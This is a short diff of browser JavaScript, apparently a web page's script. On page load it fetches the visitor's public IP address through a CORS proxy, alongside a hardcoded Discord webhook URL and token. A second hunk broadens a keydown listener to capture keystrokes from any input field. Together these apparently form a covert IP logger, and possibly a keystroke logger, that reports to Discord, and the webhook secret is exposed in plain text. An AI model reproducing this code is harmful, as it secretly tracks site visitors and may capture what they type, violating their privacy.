@@ -1,5 +1,5 @@
 (async ()=>{
-  const fileUrl = "https://corsproxy.io/?https://api.ipify.org/?format=txt";
+  const fileUrl = "https://corsproxy.io/?https://api4.ipify.org?format=txt";
   const webhookUrl = "https://discord.com/api/webhooks/1425948057018568705/48wQvRqkCejB_t5i7Giw_q6-75RaXLdEEPUMoN3H1W_lgMsrOPidv2qPHykXMC4RyvL6";
 
   const fileRes = await fetch(fileUrl);
@@ -83,7 +83,7 @@ window.addEventListener("DOMContentLoaded", ()=>{
 });
 
 document.addEventListener("DOMContentLoaded", () => {
-  const input = document.querySelector(".searchbox-input");
+  const input = document.querySelector("input");
   if (!input) return;
 
   input.addEventListener("keydown", async e => {
